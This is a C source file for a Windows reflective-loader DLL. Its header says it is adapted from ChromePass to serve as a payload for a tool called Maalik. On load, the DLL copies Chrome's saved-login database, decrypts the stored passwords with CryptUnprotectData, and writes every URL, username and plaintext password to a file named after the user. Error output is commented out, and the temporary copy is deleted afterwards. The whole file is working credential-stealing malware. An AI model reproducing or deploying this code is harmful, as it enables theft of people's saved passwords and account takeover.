/*
Original : https://github.com/thatskriptkid/ChromePass
This has been modified to work with Maalik as a Payload.
*/


#define _CRT_SECURE_NO_WARNINGS
#ifndef UNICODE
#define UNICODE
#endif

#ifndef _UNICODE
#define _UNICODE
#endif

#pragma comment(lib, "crypt32.lib")
#include "ReflectiveLoader.h"
#include <windows.h>
#include <stdio.h>
#include "sqlite/sqlite3.h"
#include <shlobj.h> /* CSIDL_LOCAL_APPDATA */

#define UNLEN 256
#define CHROME_APP_DATA_PATH  "\\Google\\Chrome\\User Data\\Default\\Login Data"
#define TEMP_DB_PATH          ".\\chromedb_tmp"
#define USER_DATA_QUERY       "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
#define ROW_ID_COUNT		100


char* SECRET_FILE;

FILE *file_with_secrets;
int row_id = 1;

static int process_row(void *passed_db, int argc, char **argv, char **col_name);
static int fill_secret_file(char *url, char *username, unsigned char *password);

void TheMainFunction(void) {
	sqlite3 *logindata_database = NULL; /* represents database where Chrome holds passwords */
	char *err_msg = NULL;
	int result;
	TCHAR original_db_location[MAX_PATH]; /* original location of Login Data */

	memset(original_db_location, 0, MAX_PATH);

	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, original_db_location))) {
		// fprintf(stderr, "SHGetFolderPath() -> Failed to get path to AppData\n");
		//return 0;
	}

	lstrcat(original_db_location, TEXT(CHROME_APP_DATA_PATH));

	/* Copy chrome database (Login Data) to a temporary location due to possible lock */
	result = CopyFile(original_db_location, TEXT(TEMP_DB_PATH), FALSE);
	if (!result) {
		// fprintf(stderr, "CopyFile() -> Cannot copy original database\n");
		//return 0;
	}

	result = sqlite3_open_v2(TEMP_DB_PATH, &logindata_database, SQLITE_OPEN_READONLY, NULL);
	if (result) {
		// fprintf(stderr, "sqlite3_open_v2() -> Cannot open database: %s\n", sqlite3_errstr(result));
		goto out;
	}
	
	SECRET_FILE = malloc(UNLEN + 1);
	DWORD len = UNLEN + 1;
	GetUserNameA(SECRET_FILE, &len);
	file_with_secrets = fopen(SECRET_FILE, "w+");
	if (!file_with_secrets) {
		// fprintf(stderr, "fopen() -> File created failed\n");
		goto out;
	}

	result = sqlite3_exec(logindata_database, USER_DATA_QUERY, process_row, logindata_database, &err_msg);
	if (result != SQLITE_OK)
		// fprintf(stderr, "sqlite3_exec() -> %s (%s)\n", err_msg, sqlite3_errstr(result));
	sqlite3_free(err_msg);
	fclose(file_with_secrets);
out:
	sqlite3_close(logindata_database);
	DeleteFile(TEXT(TEMP_DB_PATH));
}

static int process_row(void *passed_db, int argc, char **argv, char **col_name) {
	DATA_BLOB encrypted_password;
	DATA_BLOB decrypted_password;
	sqlite3_blob *blob = NULL;
	sqlite3 *db = (sqlite3*)passed_db;
	BYTE *blob_data = NULL;
	unsigned char *password_array = NULL;
	int result;
	int blob_size;
	int i;
	
	while (sqlite3_blob_open(db, "main", "logins", "password_value", row_id++, 0, &blob) != SQLITE_OK && row_id <= ROW_ID_COUNT);

	blob_size = sqlite3_blob_bytes(blob);

	blob_data = malloc(blob_size);
	if (!blob_data) {
		// fprintf(stderr, "malloc() -> Failed to allocate memory for blob_data\n");
		goto out_blob;
	}

	result = sqlite3_blob_read(blob, blob_data, blob_size, 0);
	if (result != SQLITE_OK) {
		// fprintf(stderr, "sqlite3_blob_read() -> %s\n", sqlite3_errstr(result));
		goto out_blob_data;
	}

	encrypted_password.pbData = blob_data;
	encrypted_password.cbData = blob_size;

	if (!CryptUnprotectData(&encrypted_password, NULL, NULL, NULL, NULL, 0, &decrypted_password)) {
		// fprintf(stderr, "CryptUnprotectData() -> Failed to decrypt blob\n");
		goto out_blob_data;
	}

	password_array = malloc(decrypted_password.cbData + 1);
	if (!password_array) {
		// fprintf(stderr, "malloc() -> Failed to allocate memory for password array\n");
		goto out_crypt;
	}

	memset(password_array, 0, decrypted_password.cbData);

	for (i = 0; i<decrypted_password.cbData; i++)
		password_array[i] = (unsigned char)decrypted_password.pbData[i];
	password_array[i] = '\0';

	result = fill_secret_file(argv[0], argv[1], password_array);
	if (result)
		// fprintf(stderr, "fill_secret_file() -> Failed to write to file\n");

	free(password_array);
out_crypt:
	LocalFree(decrypted_password.pbData);
out_blob_data:
	free(blob_data);
out_blob:
	sqlite3_blob_close(blob);
out_db:
	sqlite3_close(db);
	return 0;
}

static int fill_secret_file(char *url, char *username, unsigned char *password) {
	fputs("[URL] : ", file_with_secrets);
	fputs(url, file_with_secrets);
	fputs("\n[LOGIN] : ", file_with_secrets);
	fputs(username, file_with_secrets);
	fputs("\n[PASWWORD] : ", file_with_secrets);
	fputs(password, file_with_secrets);
	fputs("\n\n", file_with_secrets);

	if (ferror(file_with_secrets))
		return 1;
	return 0;
}


extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			TheMainFunction();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}